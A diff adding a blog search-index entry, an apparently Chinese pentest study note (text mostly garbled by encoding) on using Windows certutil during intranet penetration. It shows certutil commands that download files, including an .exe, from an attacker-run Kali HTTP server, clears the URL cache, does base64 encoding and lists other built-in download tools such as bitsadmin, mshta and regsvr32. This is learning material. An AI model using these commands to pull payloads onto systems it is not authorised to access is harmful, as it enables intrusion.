@@ -2270,4 +2270,102 @@
         <tag>内网渗透</tag>
       </tags>
   </entry>
+  <entry>
+    <title>��������͸ѧϰ�ʼǡ�02��������͸�е�certutil</title>
+    <url>/2021/04/01/intranet02/</url>
+    <content><![CDATA[<h2 id="����"><a href="#����" class="headerlink" title="����"></a>����</h2><p>Windows�е����ó���Certutil.exe ����Ϊ֤������һ���ֽ��а�װ��ʹ�ô˳��������Windows�а�װ�����ݡ�ɾ���������Լ�ִ��֤����صĸ��ֹ��ܡ�</p>
+<p><strong>Certutil���Դ�Զ��<code>URL</code>����֤����κ������ļ���</strong></p>
+<h2 id="���صĳ��÷���"><a href="#���صĳ��÷���" class="headerlink" title="���صĳ��÷���"></a>���صĳ��÷���</h2><ul>
+<li>����</li>
+</ul>
+<p>kali��IP��10.7.7.7��</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span>				<span class="comment">##python3</span></span><br><span class="line">python -m SimpleHTTPServer <span class="number">80</span>			<span class="comment">##python2</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><ol>
+<li>�����ڵ�ǰ·�����ļ�����ͬURL</li>
+</ol>
+</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401151204777.png" alt="image-20210401151204777"></p>
+<ul>
+<li>2)�����ڵ�ǰ·����ָ���ļ����Ʊ���</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt  a.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401151741297.png" alt="image-20210401151741297"></p>
+<ul>
+<li>3)�����ڻ���Ŀ¼���������</li>
+</ul>
+<p>����Ŀ¼λ�ã�</p>
+<p><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401152512141.png" alt="image-20210401152512141"></p>
+<ul>
+<li>4)֧�ֱ���������ļ�</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.7.7.7&#x2F;test.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401152823463.png" alt="image-20210401152823463"></p>
+<h2 id="��������l�"><a href="#��������l�" class="headerlink" title="��������ļ�"></a>��������ļ�</h2><ul>
+<li>�鿴������Ŀ</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache *</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ɾ��������Ŀ</li>
+</ul>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">certutil -urlcache * <span class="keyword">delete</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="base64����ת��"><a href="#base64����ת��" class="headerlink" title="base64����ת��"></a>base64����ת��</h2><ul>
+<li>1��base64���룺</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutill -encode InFile Outfile</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401163137364.png" alt="image-20210401163137364"></p>
+<p>�������ļ�������������ʶ��Ϣ��</p>
+<p>�ļ�ͷ��</p>
+<p><code>----BEGIN CERTIFICATE-----</code></p>
+<p>�ļ�β��</p>
+<p><code>-----END CERTIFICATE-----</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401163309621.png" alt="image-20210401163309621"></p>
+<ul>
+<li>2)base64����</li>
+</ul>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">certutil -<span class="keyword">decode</span> <span class="keyword">InFile</span> <span class="keyword">OutFile</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="С��"><a href="#С��" class="headerlink" title="С��"></a>С��</h2><p>��Ҫ�ܽ���certutil�ļ������ط��������ҽ�����base64����ת���ĳ��÷�����</p>
+<p><code>Windows</code>�����ļ���������չ��</p>
+<ul>
+<li>bitsadmin</li>
+<li>powershell</li>
+<li>mshta</li>
+<li>regsvr32</li>
+<li>csc</li>
+<li>vbs</li>
+<li>wget</li>
+<li>ftp</li>
+<li>debug</li>
+<li>tftp</li>
+</ul>
+]]></content>
+      <categories>
+        <category>����ѧϰ�ʼ�</category>
+      </categories>
+      <tags>
+        <tag>���</tag>
+        <tag>ѧϰ�ʼ�</tag>
+        <tag>������͸</tag>
+        <tag>certutil</tag>
+      </tags>
+  </entry>
 </search>
